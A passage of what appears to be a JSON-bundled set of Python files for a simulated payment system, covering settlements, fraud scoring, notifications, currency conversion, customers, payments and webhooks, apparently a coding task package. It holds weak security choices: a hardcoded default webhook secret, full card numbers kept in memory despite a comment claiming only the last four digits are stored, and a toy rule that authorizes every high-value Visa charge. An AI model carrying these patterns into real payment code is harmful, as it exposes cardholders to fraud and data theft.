\n        return {\n            \""status\"": \""success\"",\n            \""settlement_id\"": settlement_id,\n            \""transaction_count\"": len(eligible_transactions),\n            \""net_amount\"": str(net_amount)\n        }\n    \n    def _get_eligible_transactions(self, merchant_id: str) -> List[Dict]:\n        eligible = []\n        now = datetime.datetime.now()\n        \n        for trans in self.pending_transactions:\n            if trans['merchant_id'] != merchant_id:\n                continue\n                \n            days_waiting = (now - trans['created_at']).days\n            required_days = self.settlement_schedule.get(trans['settlement_type'], 2)\n            \n            if days_waiting >= required_days:\n                eligible.append(trans)\n                \n        return eligible\n    \n    def _calculate_settlement_date(self, settlement_type: str) -> str:\n        days = self.settlement_schedule.get(settlement_type, 2)\n        settlement_date = datetime.datetime.now() + datetime.timedelta(days=days)\n        \n        # Skip weekends\n        while settlement_date.weekday() in [5, 6]:  # Saturday, Sunday\n            settlement_date += datetime.timedelta(days=1)\n            \n        return settlement_date.strftime('%Y-%m-%d')\n    \n    def _generate_settlement_id(self) -> str:\n        return f\""SET{uuid.uuid4().hex[:12].upper()}\""\n    \n    def process_settlement(self, settlement_id: str) -> Dict:\n        if settlement_id not in self.settlements:\n            return {\""status\"": \""error\"", \""message\"": \""Settlement not found\""}\n            \n        settlement = self.settlements[settlement_id]\n        \n        if settlement['status'] != 'pending':\n            return {\""status\"": \""error\"", \""message\"": f\""Settlement already {settlement['status']}\""}\n            \n        # Simulate processing\n        settlement['status'] = 'processing'\n        settlement['processing_started_at'] = datetime.datetime.now()\n        \n        # Simulate bank transfer\n        if self._initiate_bank_transfer(settlement):\n            settlement['status'] = 'completed'\n            settlement['completed_at'] = datetime.datetime.now()\n            settlement['bank_reference'] = f\""REF{uuid.uuid4().hex[:8].upper()}\""\n            \n            return {\n                \""status\"": \""success\"",\n                \""settlement_id\"": settlement_id,\n                \""bank_reference\"": settlement['bank_reference'],\n                \""amount_transferred\"": str(settlement['net_amount'])\n            }\n        else:\n            settlement['status'] = 'failed'\n            settlement['failed_at'] = datetime.datetime.now()\n            settlement['failure_reason'] = 'Bank transfer failed'\n            \n            return {\n                \""status\"": \""failed\"",\n                \""settlement_id\"": settlement_id,\n                \""error\"": \""Bank transfer failed\""\n            }\n    \n    def _initiate_bank_transfer(self, settlement: Dict) -> bool:\n        # Simulate bank transfer success rate\n        return settlement['net_amount'] > 0\n    \n    def get_settlement_status(self, settlement_id: str) -> Optional[Dict]:\n        if settlement_id not in self.settlements:\n            return None\n            \n        settlement = self.settlements[settlement_id]\n        \n        return {\n            'settlement_id': settlement_id,\n            'merchant_id': settlement['merchant_id'],\n            'status': settlement['status'],\n            'transaction_count': settlement['transaction_count'],\n            'net_amount': str(settlement['net_amount']),\n            'created_at': settlement['created_at'].isoformat(),\n            'bank_reference': settlement.get('bank_reference')\n        }\n    \n    def get_pending_amount(self, merchant_id: str) -> Dict:\n        total_pending = Decimal('0')\n        transaction_count = 0\n        \n        for trans in self.pending_transactions:\n            if trans['merchant_id'] == merchant_id:\n                net_amount = trans['amount'] - trans['fee']\n                total_pending += net_amount\n                transaction_count += 1\n                \n        return {\n            'merchant_id': merchant_id,\n            'pending_amount': str(total_pending),\n            'pending_transactions': transaction_count,\n            'next_settlement_date': self._get_next_settlement_date(merchant_id)\n        }\n    \n    def _get_next_settlement_date(self, merchant_id: str) -> Optional[str]:\n        earliest_eligible = None\n        \n        for trans in self.pending_transactions:\n            if trans['merchant_id'] == merchant_id:\n                settlement_date = trans['created_at'] + datetime.timedelta(\n                    days=self.settlement_schedule.get(trans['settlement_type'], 2)\n                )\n                \n                # Skip weekends\n                while settlement_date.weekday() in [5, 6]:\n                    settlement_date += datetime.timedelta(days=1)\n                    \n                if earliest_eligible is None or settlement_date < earliest_eligible:\n                    earliest_eligible = settlement_date\n                    \n        return earliest_eligible.strftime('%Y-%m-%d') if earliest_eligible else None\n    \n    def get_settlement_history(self, merchant_id: str, days: int = 30) -> List[Dict]:\n        cutoff_date = datetime.datetime.now() - datetime.timedelta(days=days)\n        history = []\n        \n        for settlement in self.settlements.values():\n            if (settlement['merchant_id'] == merchant_id and \n                settlement['created_at'] > cutoff_date):\n                history.append({\n                    'settlement_id': settlement['id'],\n                    'date': settlement['created_at'].strftime('%Y-%m-%d'),\n                    'status': settlement['status'],\n                    'transaction_count': settlement['transaction_count'],\n                    'net_amount': str(settlement['net_amount']),\n                    'bank_reference': settlement.get('bank_reference')\n                })\n                \n        return sorted(history, key=lambda x: x['date'], reverse=True)\n    \n    def generate_settlement_report(self, start_date: datetime.date, \n                                 end_date: datetime.date) -> Dict:\n        total_settlements = 0\n        total_amount = Decimal('0')\n        by_status = {}\n        by_merchant = {}\n        \n        for settlement in self.settlements.values():\n            settlement_date = settlement['created_at'].date()\n            \n            if start_date <= settlement_date <= end_date:\n                total_settlements += 1\n                total_amount += settlement['net_amount']\n                \n                # Count by status\n                status = settlement['status']\n                by_status[status] = by_status.get(status, 0) + 1\n                \n                # Sum by merchant\n                merchant_id = settlement['merchant_id']\n                if merchant_id not in by_merchant:\n                    by_merchant[merchant_id] = {\n                        'count': 0,\n                        'total_amount': Decimal('0')\n                    }\n                by_merchant[merchant_id]['count'] += 1\n                by_merchant[merchant_id]['total_amount'] += settlement['net_amount']\n                \n        return {\n            'period': f\""{start_date} to {end_date}\"",\n            'total_settlements': total_settlements,\n            'total_amount': str(total_amount),\n            'average_settlement': str(total_amount / total_settlements) if total_settlements > 0 else '0',\n            'by_status': by_status,\n            'top_merchants': sorted(\n                [{'merchant_id': k, 'count': v['count'], 'amount': str(v['total_amount'])} \n                 for k, v in by_merchant.items()],\n                key=lambda x: x['amount'],\n                reverse=True\n            )[:10]\n        }"", ""fraud_detector.py"": ""from decimal import Decimal\nfrom typing import Dict, List, Optional, Tuple\nimport datetime\nimport statistics\n\n\nclass FraudDetector:\n    def __init__(self):\n        self.transaction_history = {}\n        self.blacklisted_cards = set()\n        self.suspicious_ips = set()\n        self.risk_thresholds = {\n            'velocity': 5,  # transactions per hour\n            'amount_spike': Decimal('3.0'),  # multiplier of average\n            'location_changes': 3  # different locations per day\n        }\n        \n    def analyze_transaction(self, card_number: str, amount: Decimal, \n                          ip_address: str, location: Optional[str] = None) -> Dict:\n        risk_score = 0\n        risk_factors = []\n        \n        # Check blacklist\n        if self._is_blacklisted(card_number):\n            return {\""risk_level\"": \""high\"", \""score\"": 100, \""factors\"": [\""blacklisted_card\""], \""action\"": \""block\""}\n            \n        # Check suspicious IP\n        if ip_address in self.suspicious_ips:\n            risk_score += 30\n            risk_factors.append(\""suspicious_ip\"")\n            \n        # Velocity check\n        velocity_risk = self._check_velocity(card_number)\n        if velocity_risk > 0:\n            risk_score += velocity_risk\n            risk_factors.append(f\""high_velocity_{velocity_risk}\"")\n            \n        # Amount anomaly check\n        amount_risk = self._check_amount_anomaly(card_number, amount)\n        if amount_risk > 0:\n            risk_score += amount_risk\n            risk_factors.append(f\""amount_anomaly_{amount_risk}\"")\n            \n        # Location check\n        if location:\n            location_risk = self._check_location_pattern(card_number, location)\n            if location_risk > 0:\n                risk_score += location_risk\n                risk_factors.append(f\""location_anomaly_{location_risk}\"")\n                \n        # Pattern analysis\n        pattern_risk = self._analyze_patterns(card_number, amount, ip_address)\n        if pattern_risk > 0:\n            risk_score += pattern_risk\n            risk_factors.append(\""suspicious_pattern\"")\n            \n        # Determine risk level and action\n        if risk_score >= 70:\n            risk_level = \""high\""\n            action = \""block\""\n        elif risk_score >= 40:\n            risk_level = \""medium\"" \n            action = \""review\""\n        else:\n            risk_level = \""low\""\n            action = \""approve\""\n            \n        # Log transaction\n        self._log_transaction(card_number, amount, ip_address, location, risk_score)\n        \n        return {\n            \""risk_level\"": risk_level,\n            \""score\"": risk_score,\n            \""factors\"": risk_factors,\n            \""action\"": action\n        }\n    \n    def _is_blacklisted(self, card_number: str) -> bool:\n        return card_number in self.blacklisted_cards\n    \n    def _check_velocity(self, card_number: str) -> int:\n        if card_number not in self.transaction_history:\n            return 0\n            \n        recent_transactions = self._get_recent_transactions(card_number, hours=1)\n        if len(recent_transactions) >= self.risk_thresholds['velocity']:\n            return 25\n        elif len(recent_transactions) >= self.risk_thresholds['velocity'] - 2:\n            return 15\n        return 0\n    \n    def _check_amount_anomaly(self, card_number: str, amount: Decimal) -> int:\n        if card_number not in self.transaction_history:\n            return 0\n            \n        amounts = [t['amount'] for t in self.transaction_history[card_number][-20:]]\n        if len(amounts) < 5:\n            return 0\n            \n        avg_amount = statistics.mean(amounts)\n        if amount > avg_amount * self.risk_thresholds['amount_spike']:\n            return 20\n        elif amount > avg_amount * 2:\n            return 10\n        return 0\n    \n    def _check_location_pattern(self, card_number: str, location: str) -> int:\n        if card_number not in self.transaction_history:\n            return 0\n            \n        today_transactions = self._get_recent_transactions(card_number, hours=24)\n        locations = set(t.get('location') for t in today_transactions if t.get('location'))\n        \n        if len(locations) >= self.risk_thresholds['location_changes']:\n            return 25\n        elif len(locations) >= 2 and location not in locations:\n            return 15\n        return 0\n    \n    def _analyze_patterns(self, card_number: str, amount: Decimal, ip_address: str) -> int:\n        # Check for card testing pattern (small amounts)\n        if amount < Decimal('1.00'):\n            recent = self._get_recent_transactions(card_number, hours=1)\n            small_amounts = sum(1 for t in recent if t['amount'] < Decimal('1.00'))\n            if small_amounts >= 3:\n                return 30\n                \n        # Check for round number pattern\n        if str(amount).endswith('00.00') and amount > Decimal('100'):\n            return 10\n            \n        return 0\n    \n    def _get_recent_transactions(self, card_number: str, hours: int) -> List[Dict]:\n        if card_number not in self.transaction_history:\n            return []\n            \n        cutoff_time = datetime.datetime.now() - datetime.timedelta(hours=hours)\n        return [t for t in self.transaction_history[card_number] \n                if t['timestamp'] > cutoff_time]\n    \n    def _log_transaction(self, card_number: str, amount: Decimal, \n                        ip_address: str, location: Optional[str], risk_score: int):\n        if card_number not in self.transaction_history:\n            self.transaction_history[card_number] = []\n            \n        self.transaction_history[card_number].append({\n            'timestamp': datetime.datetime.now(),\n            'amount': amount,\n            'ip_address': ip_address,\n            'location': location,\n            'risk_score': risk_score\n        })\n        \n        # Keep only last 100 transactions per card\n        if len(self.transaction_history[card_number]) > 100:\n            self.transaction_history[card_number] = self.transaction_history[card_number][-100:]\n    \n    def add_to_blacklist(self, card_number: str) -> bool:\n        if card_number and len(card_number) >= 13:\n            self.blacklisted_cards.add(card_number)\n            return True\n        return False\n    \n    def add_suspicious_ip(self, ip_address: str) -> bool:\n        if ip_address:\n            self.suspicious_ips.add(ip_address)\n            return True\n        return False\n    \n    def get_card_risk_profile(self, card_number: str) -> Dict:\n        if card_number not in self.transaction_history:\n            return {\""status\"": \""no_history\"", \""transactions\"": 0}\n            \n        transactions = self.transaction_history[card_number]\n        risk_scores = [t['risk_score'] for t in transactions]\n        \n        return {\n            \""status\"": \""profiled\"",\n            \""transactions\"": len(transactions),\n            \""average_risk\"": statistics.mean(risk_scores) if risk_scores else 0,\n            \""max_risk\"": max(risk_scores) if risk_scores else 0,\n            \""high_risk_count\"": sum(1 for s in risk_scores if s >= 70),\n            \""last_transaction\"": transactions[-1]['timestamp'].isoformat() if transactions else None\n        }\n    \n    def generate_risk_report(self, start_date: datetime.date, end_date: datetime.date) -> Dict:\n        all_transactions = []\n        for card_transactions in self.transaction_history.values():\n            for trans in card_transactions:\n                if start_date <= trans['timestamp'].date() <= end_date:\n                    all_transactions.append(trans)\n                    \n        if not all_transactions:\n            return {\n                \""period\"": f\""{start_date} to {end_date}\"",\n                \""total_transactions\"": 0,\n                \""high_risk_transactions\"": 0,\n                \""blocked_transactions\"": 0\n            }\n            \n        high_risk = sum(1 for t in all_transactions if t['risk_score'] >= 70)\n        medium_risk = sum(1 for t in all_transactions if 40 <= t['risk_score'] < 70)\n        \n        return {\n            \""period\"": f\""{start_date} to {end_date}\"",\n            \""total_transactions\"": len(all_transactions),\n            \""high_risk_transactions\"": high_risk,\n            \""medium_risk_transactions\"": medium_risk,\n            \""average_risk_score\"": statistics.mean(t['risk_score'] for t in all_transactions),\n            \""unique_cards\"": len(self.transaction_history)\n        }"", ""pytest.ini"": ""[pytest]\ntestpaths = tests\npython_files = test_*.py\npython_classes = Test*\npython_functions = test_*\naddopts = -v --tb=short"", ""notification_service.py"": ""from typing import Dict, List, Optional\nimport datetime\nimport re\n\n\nclass NotificationService:\n    def __init__(self):\n        self.templates = {\n            'payment_success': \""Your payment of ${amount} has been processed successfully. Transaction ID: {transaction_id}\"",\n            'payment_failed': \""Your payment of ${amount} could not be processed. Reason: {reason}\"",\n            'refund_approved': \""Your refund of ${amount} has been approved. Refund ID: {refund_id}\"",\n            'suspicious_activity': \""Suspicious activity detected on your account. Please contact support.\"",\n            'batch_completed': \""Batch {batch_id} processing completed. Processed: {processed}, Failed: {failed}\""\n        }\n        self.notifications = []\n        self.preferences = {}\n        \n    def send_notification(self, recipient: str, template_name: str, \n                         params: Dict, channel: str = 'email') -> Dict:\n        if template_name not in self.templates:\n            return {\""status\"": \""error\"", \""message\"": \""Template not found\""}\n            \n        if not self._validate_recipient(recipient, channel):\n            return {\""status\"": \""error\"", \""message\"": f\""Invalid {channel} recipient\""}\n            \n        # Check preferences\n        if not self._check_preferences(recipient, template_name):\n            return {\""status\"": \""skipped\"", \""message\"": \""User opted out of this notification type\""}\n            \n        # Format message\n        try:\n            message = self.templates[template_name].format(**params)\n        except KeyError as e:\n            return {\""status\"": \""error\"", \""message\"": f\""Missing parameter: {e}\""}\n            \n        notification = {\n            'id': self._generate_notification_id(),\n            'recipient': recipient,\n            'channel': channel,\n            'template': template_name,\n            'message': message,\n            'status': 'sent',\n            'sent_at': datetime.datetime.now()\n        }\n        \n        self.notifications.append(notification)\n        \n        return {\n            \""status\"": \""success\"",\n            \""notification_id\"": notification['id'],\n            \""message\"": message\n        }\n    \n    def _validate_recipient(self, recipient: str, channel: str) -> bool:\n        if channel == 'email':\n            return bool(re.match(r'^[\\w\\.-]+@[\\w\\.-]+\\.\\w+$', recipient))\n        elif channel == 'sms':\n            return bool(re.match(r'^\\+?1?\\d{10,14}$', recipient))\n        return False\n    \n    def _check_preferences(self, recipient: str, template_name: str) -> bool:\n        if recipient not in self.preferences:\n            return True  # Default to sending if no preferences set\n            \n        prefs = self.preferences[recipient]\n        \n        # Check if opted out of all notifications\n        if prefs.get('all_notifications') is False:\n            return False\n            \n        # Check specific notification type\n        if prefs.get(template_name) is False:\n            return False\n            \n        return True\n    \n    def _generate_notification_id(self) -> str:\n        return f\""NOTIF{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}\""\n    \n    def set_preferences(self, recipient: str, preferences: Dict) -> Dict:\n        self.preferences[recipient] = preferences\n        \n        return {\n            \""status\"": \""success\"",\n            \""recipient\"": recipient,\n            \""preferences\"": preferences\n        }\n    \n    def get_notification_history(self, recipient: str, days: int = 7) -> List[Dict]:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(days=days)\n        \n        history = []\n        for notification in self.notifications:\n            if (notification['recipient'] == recipient and \n                notification['sent_at'] > cutoff_time):\n                history.append({\n                    'id': notification['id'],\n                    'template': notification['template'],\n                    'channel': notification['channel'],\n                    'sent_at': notification['sent_at'].isoformat(),\n                    'status': notification['status']\n                })\n                \n        return sorted(history, key=lambda x: x['sent_at'], reverse=True)\n    \n    def create_custom_template(self, template_name: str, template_text: str) -> Dict:\n        if template_name in self.templates:\n            return {\""status\"": \""error\"", \""message\"": \""Template already exists\""}\n            \n        # Validate template has valid placeholders\n        try:\n            test_params = {k: 'test' for k in re.findall(r'\\{(\\w+)\\}', template_text)}\n            template_text.format(**test_params)\n        except KeyError as e:\n            return {\""status\"": \""error\"", \""message\"": f\""Invalid placeholder: {e}\""}\n            \n        self.templates[template_name] = template_text\n        \n        return {\n            \""status\"": \""success\"",\n            \""template_name\"": template_name,\n            \""placeholders\"": list(test_params.keys())\n        }\n    \n    def bulk_send(self, recipients: List[str], template_name: str, \n                  params: Dict, channel: str = 'email') -> Dict:\n        sent = 0\n        failed = 0\n        skipped = 0\n        \n        for recipient in recipients:\n            result = self.send_notification(recipient, template_name, params, channel)\n            \n            if result['status'] == 'success':\n                sent += 1\n            elif result['status'] == 'skipped':\n                skipped += 1\n            else:\n                failed += 1\n                \n        return {\n            'total': len(recipients),\n            'sent': sent,\n            'failed': failed,\n            'skipped': skipped\n        }\n    \n    def get_notification_stats(self, hours: int = 24) -> Dict:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(hours=hours)\n        \n        stats = {\n            'total_sent': 0,\n            'by_channel': {},\n            'by_template': {},\n            'unique_recipients': set()\n        }\n        \n        for notification in self.notifications:\n            if notification['sent_at'] > cutoff_time:\n                stats['total_sent'] += 1\n                stats['unique_recipients'].add(notification['recipient'])\n                \n                # Count by channel\n                channel = notification['channel']\n                stats['by_channel'][channel] = stats['by_channel'].get(channel, 0) + 1\n                \n                # Count by template\n                template = notification['template']\n                stats['by_template'][template] = stats['by_template'].get(template, 0) + 1\n                \n        stats['unique_recipients'] = len(stats['unique_recipients'])\n        \n        return stats\n    \n    def cleanup_old_notifications(self, days: int = 30) -> int:\n        cutoff_time = datetime.datetime.now() - datetime.timedelta(days=days)\n        original_count = len(self.notifications)\n        \n        self.notifications = [\n            n for n in self.notifications \n            if n['sent_at'] > cutoff_time\n        ]\n        \n        return original_count - len(self.notifications)"", ""currency_converter.py"": ""from decimal import Decimal\nfrom typing import Dict, Optional\nimport json\n\n\nclass CurrencyConverter:\n    def __init__(self):\n        self.rates = {\n            'USD': Decimal('1.0'),\n            'EUR': Decimal('0.85'),\n            'GBP': Decimal('0.73'),\n            'JPY': Decimal('110.0'),\n            'CAD': Decimal('1.25'),\n            'AUD': Decimal('1.35')\n        }\n        self.cache = {}\n        \n    def convert(self, amount: Decimal, from_currency: str, to_currency: str) -> Optional[Decimal]:\n        if from_currency not in self.rates or to_currency not in self.rates:\n            return None\n            \n        if from_currency == to_currency:\n            return amount\n            \n        cache_key = f\""{from_currency}:{to_currency}\""\n        if cache_key in self.cache:\n            rate = self.cache[cache_key]\n        else:\n            rate = self.rates[to_currency] / self.rates[from_currency]\n            self.cache[cache_key] = rate\n            \n        return amount * rate\n    \n    def update_rate(self, currency: str, rate: Decimal) -> bool:\n        if currency == 'USD':\n            return False  # USD is base currency\n            \n        if rate <= 0:\n            return False\n            \n        self.rates[currency] = rate\n        self.cache.clear()  # Invalidate cache\n        return True\n    \n    def get_supported_currencies(self) -> list:\n        return list(self.rates.keys())\n    \n    def bulk_convert(self, amounts: Dict[str, Decimal], target_currency: str) -> Dict[str, Optional[Decimal]]:\n        results = {}\n        for currency, amount in amounts.items():\n            try:\n                results[currency] = self.convert(amount, currency, target_currency)\n            except Exception:\n                results[currency] = None\n        return results\n    \n    def get_exchange_rate(self, from_currency: str, to_currency: str) -> Optional[Decimal]:\n        if from_currency not in self.rates or to_currency not in self.rates:\n            return None\n            \n        return self.rates[to_currency] / self.rates[from_currency]\n    \n    def save_rates_to_file(self, filename: str) -> bool:\n        try:\n            rates_dict = {k: str(v) for k, v in self.rates.items()}\n            with open(filename, 'w') as f:\n                json.dump(rates_dict, f, indent=2)\n            return True\n        except Exception:\n            return False\n    \n    def load_rates_from_file(self, filename: str) -> bool:\n        try:\n            with open(filename, 'r') as f:\n                rates_dict = json.load(f)\n            for currency, rate in rates_dict.items():\n                self.rates[currency] = Decimal(rate)\n            self.cache.clear()\n            return True\n        except Exception:\n            return False"", ""__init__.py"": ""# Payment processing system package"", ""customer_manager.py"": ""from typing import Dict, List, Optional\nimport datetime\nimport hashlib\n\n\nclass CustomerManager:\n    def __init__(self):\n        self.customers = {}\n        self.customer_cards = {}  # Maps card to customer\n        \n    def create_customer(self, email: str, name: str) -> Dict:\n        if not email or '@' not in email:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid email\""}\n            \n        customer_id = self._generate_customer_id(email)\n        \n        if customer_id in self.customers:\n            return {\""status\"": \""error\"", \""message\"": \""Customer already exists\""}\n            \n        self.customers[customer_id] = {\n            'id': customer_id,\n            'email': email,\n            'name': name,\n            'created_at': datetime.datetime.now(),\n            'cards': [],\n            'status': 'active',\n            'metadata': {}\n        }\n        \n        return {\""status\"": \""success\"", \""customer_id\"": customer_id}\n    \n    def add_card(self, customer_id: str, card_number: str) -> Dict:\n        if customer_id not in self.customers:\n            return {\""status\"": \""error\"", \""message\"": \""Customer not found\""}\n            \n        if not card_number or len(card_number) < 13:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid card number\""}\n            \n        # Store only last 4 digits for security\n        card_token = f\""****{card_number[-4:]}\""\n        \n        if card_token not in self.customers[customer_id]['cards']:\n            self.customers[customer_id]['cards'].append(card_token)\n            self.customer_cards[card_number] = customer_id\n            \n        return {\""status\"": \""success\"", \""card_token\"": card_token}\n    \n    def get_customer_by_card(self, card_number: str) -> Optional[Dict]:\n        customer_id = self.customer_cards.get(card_number)\n        if customer_id:\n            return self.customers.get(customer_id)\n        return None\n    \n    def update_customer_status(self, customer_id: str, status: str) -> Dict:\n        if customer_id not in self.customers:\n            return {\""status\"": \""error\"", \""message\"": \""Customer not found\""}\n            \n        valid_statuses = ['active', 'suspended', 'closed']\n        if status not in valid_statuses:\n            return {\""status\"": \""error\"", \""message\"": f\""Invalid status. Must be one of: {valid_statuses}\""}\n            \n        self.customers[customer_id]['status'] = status\n        self.customers[customer_id]['status_updated_at'] = datetime.datetime.now()\n        \n        return {\""status\"": \""success\"", \""new_status\"": status}\n    \n    def get_customer_history(self, customer_id: str) -> Optional[Dict]:\n        if customer_id not in self.customers:\n            return None\n            \n        customer = self.customers[customer_id]\n        \n        return {\n            'customer_id': customer_id,\n            'email': customer['email'],\n            'name': customer['name'],\n            'status': customer['status'],\n            'created_at': customer['created_at'].isoformat(),\n            'card_count': len(customer['cards']),\n            'account_age_days': (datetime.datetime.now() - customer['created_at']).days\n        }\n    \n    def search_customers(self, query: str) -> List[Dict]:\n        results = []\n        query_lower = query.lower()\n        \n        for customer_id, customer in self.customers.items():\n            if (query_lower in customer['email'].lower() or \n                query_lower in customer['name'].lower()):\n                results.append({\n                    'customer_id': customer_id,\n                    'email': customer['email'],\n                    'name': customer['name'],\n                    'status': customer['status']\n                })\n                \n        return results\n    \n    def _generate_customer_id(self, email: str) -> str:\n        return f\""CUS{hashlib.md5(email.encode()).hexdigest()[:8].upper()}\""\n    \n    def bulk_update_status(self, customer_ids: List[str], new_status: str) -> Dict:\n        success_count = 0\n        failed_ids = []\n        \n        for customer_id in customer_ids:\n            result = self.update_customer_status(customer_id, new_status)\n            if result['status'] == 'success':\n                success_count += 1\n            else:\n                failed_ids.append(customer_id)\n                \n        return {\n            'total': len(customer_ids),\n            'success': success_count,\n            'failed': len(failed_ids),\n            'failed_ids': failed_ids\n        }\n    \n    def get_active_customers_count(self) -> int:\n        return sum(1 for c in self.customers.values() if c['status'] == 'active')\n    \n    def export_customer_list(self, status_filter: Optional[str] = None) -> List[Dict]:\n        customers = []\n        \n        for customer in self.customers.values():\n            if status_filter and customer['status'] != status_filter:\n                continue\n                \n            customers.append({\n                'id': customer['id'],\n                'email': customer['email'],\n                'name': customer['name'],\n                'status': customer['status'],\n                'created_at': customer['created_at'].isoformat(),\n                'card_count': len(customer['cards'])\n            })\n            \n        return sorted(customers, key=lambda x: x['created_at'], reverse=True)"", ""payment_processor.py"": ""import datetime\nfrom decimal import Decimal\nfrom typing import Dict, Optional, List\nimport hashlib\nimport json\n\n\nclass PaymentProcessor:\n    def __init__(self, merchant_id: str):\n        self.merchant_id = merchant_id\n        self.transaction_log = []\n        self.failed_attempts = {}\n        \n    def process_payment(self, amount: Decimal, card_number: str, cvv: str) -> Dict:\n        if not self._validate_card(card_number):\n            return {\""status\"": \""failed\"", \""error\"": \""Invalid card number\""}\n            \n        if amount <= 0:\n            return {\""status\"": \""failed\"", \""error\"": \""Invalid amount\""}\n            \n        if amount > Decimal('10000'):\n            if not self._check_high_value_authorization(card_number):\n                return {\""status\"": \""failed\"", \""error\"": \""High value transaction not authorized\""}\n                \n        transaction_id = self._generate_transaction_id(card_number, amount)\n        \n        # Anti-fraud check\n        if self._is_suspicious_pattern(card_number, amount):\n            self._log_suspicious_activity(card_number, amount)\n            return {\""status\"": \""failed\"", \""error\"": \""Transaction flagged for review\""}\n            \n        # Process the payment\n        result = self._execute_transaction(transaction_id, amount, card_number)\n        \n        if result[\""success\""]:\n            self.transaction_log.append({\n                \""id\"": transaction_id,\n                \""amount\"": str(amount),\n                \""timestamp\"": datetime.datetime.now().isoformat()\n            })\n            return {\""status\"": \""success\"", \""transaction_id\"": transaction_id}\n        else:\n            self._handle_failed_transaction(card_number, amount, result[\""reason\""])\n            return {\""status\"": \""failed\"", \""error\"": result[\""reason\""]}\n    \n    def _validate_card(self, card_number: str) -> bool:\n        if not card_number or len(card_number) < 13 or len(card_number) > 19:\n            return False\n            \n        # Luhn algorithm\n        digits = [int(d) for d in card_number if d.isdigit()]\n        checksum = 0\n        for i, digit in enumerate(reversed(digits[:-1])):\n            if i % 2 == 0:\n                doubled = digit * 2\n                checksum += doubled if doubled < 10 else doubled - 9\n            else:\n                checksum += digit\n        return (checksum + digits[-1]) % 10 == 0\n    \n    def _check_high_value_authorization(self, card_number: str) -> bool:\n        # Complex authorization logic\n        prefix = card_number[:6]\n        if prefix.startswith('4'):  # Visa\n            return True\n        elif prefix.startswith('5'):  # Mastercard\n            return self._verify_mastercard_auth(card_number)\n        elif prefix.startswith('3'):  # Amex\n            return False  # Requires special handling\n        else:\n            return False\n    \n    def _verify_mastercard_auth(self, card_number: str) -> bool:\n        # Additional mastercard verification\n        middle_digits = card_number[6:12]\n        return sum(int(d) for d in middle_digits) % 7 == 0\n    \n    def _generate_transaction_id(self, card_number: str, amount: Decimal) -> str:\n        data = f\""{self.merchant_id}:{card_number}:{amount}:{datetime.datetime.now()}\""\n        return hashlib.sha256(data.encode()).hexdigest()[:16]\n    \n    def _is_suspicious_pattern(self, card_number: str, amount: Decimal) -> bool:\n        # Check for rapid repeated attempts\n        key = card_number[:6] + card_number[-4:]\n        if key in self.failed_attempts:\n            recent_fails = [t for t in self.failed_attempts[key] \n                          if (datetime.datetime.now() - t).seconds < 300]\n            if len(recent_fails) >= 3:\n                return True\n                \n        # Check for unusual amount patterns\n        if str(amount).endswith('99.99') and amount > 500:\n            return True\n            \n        return False\n    \n    def _log_suspicious_activity(self, card_number: str, amount: Decimal):\n        with open('suspicious_transactions.log', 'a') as f:\n            f.write(f\""{datetime.datetime.now()}: Card {card_number[:4]}...{card_number[-4:]} Amount: {amount}\\n\"")\n    \n    def _execute_transaction(self, transaction_id: str, amount: Decimal, card_number: str) -> Dict:\n        # Simulate payment gateway interaction\n        if card_number.startswith('4111111111111111'):  # Test card\n            return {\""success\"": True}\n        \n        # Random failure conditions\n        hash_val = int(hashlib.md5(transaction_id.encode()).hexdigest()[:8], 16)\n        if hash_val % 100 < 5:  # 5% failure rate\n            return {\""success\"": False, \""reason\"": \""Gateway timeout\""}\n        elif hash_val % 100 < 10:  # Another 5% \n            return {\""success\"": False, \""reason\"": \""Insufficient funds\""}\n            \n        return {\""success\"": True}\n    \n    def _handle_failed_transaction(self, card_number: str, amount: Decimal, reason: str):\n        key = card_number[:6] + card_number[-4:]\n        if key not in self.failed_attempts:\n            self.failed_attempts[key] = []\n        self.failed_attempts[key].append(datetime.datetime.now())\n        \n    def get_transaction_history(self, limit: int = 10) -> List[Dict]:\n        return self.transaction_log[-limit:]\n    \n    def calculate_daily_total(self, date: datetime.date) -> Decimal:\n        total = Decimal('0')\n        for transaction in self.transaction_log:\n            trans_date = datetime.datetime.fromisoformat(transaction['timestamp']).date()\n            if trans_date == date:\n                total += Decimal(transaction['amount'])\n        return total\n    \n    def export_report(self, start_date: datetime.date, end_date: datetime.date) -> Dict:\n        filtered_transactions = []\n        for transaction in self.transaction_log:\n            trans_date = datetime.datetime.fromisoformat(transaction['timestamp']).date()\n            if start_date <= trans_date <= end_date:\n                filtered_transactions.append(transaction)\n                \n        if not filtered_transactions:\n            return {\""transactions\"": [], \""total\"": \""0\"", \""count\"": 0}\n            \n        total = sum(Decimal(t['amount']) for t in filtered_transactions)\n        \n        return {\n            \""transactions\"": filtered_transactions,\n            \""total\"": str(total),\n            \""count\"": len(filtered_transactions),\n            \""average\"": str(total / len(filtered_transactions))\n        }"", ""webhook_handler.py"": ""import json\nimport datetime\nimport hashlib\nimport hmac\nfrom typing import Dict, List, Optional\n\n\nclass WebhookHandler:\n    def __init__(self, secret_key: str = \""webhook_secret_key\""):\n        self.secret_key = secret_key\n        self.endpoints = {}\n        self.event_queue = []\n        self.retry_limits = {\n            'max_retries': 3,\n            'retry_delay_seconds': 60\n        }\n        \n    def register_endpoint(self, event_type: str, url: str) -> Dict:\n        if not event_type or not url:\n            return {\""status\"": \""error\"", \""message\"": \""Invalid parameters\""}\n            \n        if event_type not in self.endpoints:\n            self.endpoints[event_type] = []\n            \n        endpoint_config = {\n            'url': url,\n            'active': True,\n            'created_at': datetime.datetime.now(),\n            'failure_count': 0\n        }\n        \n        self.endpoints[event_type].append(endpoint_config)\n        \n        return {\""status\"": \""success\"", \""message\"": f\""Endpoint registered for {event_type}\""}\n    \n    def trigger_event(self, event_type: str, payload: Dict) -> Dict:\n        if event_type not in self.endpoints:\n            return {\""status\"": \""error\"", \""message\"": \""No endpoints registered for event type\""}\n            \n        event = {\n            'id': self._generate_event_id(),\n            'type': event_type,\n            'payload': payload,\n            'timestamp': datetime.datetime.now(),\n            'attempts': []\n        }\n        \n        self.event_queue.append(event)\n        \n        # Process webhooks for active endpoints\n        successful = 0\n        failed = 0\n        \n        for endpoint in self.endpoints[event_type]:\n            if endpoint['active']:\n                result = self._send_webhook(endpoint, event)\n                if result['success']:\n                    successful += 1\n                else:\n          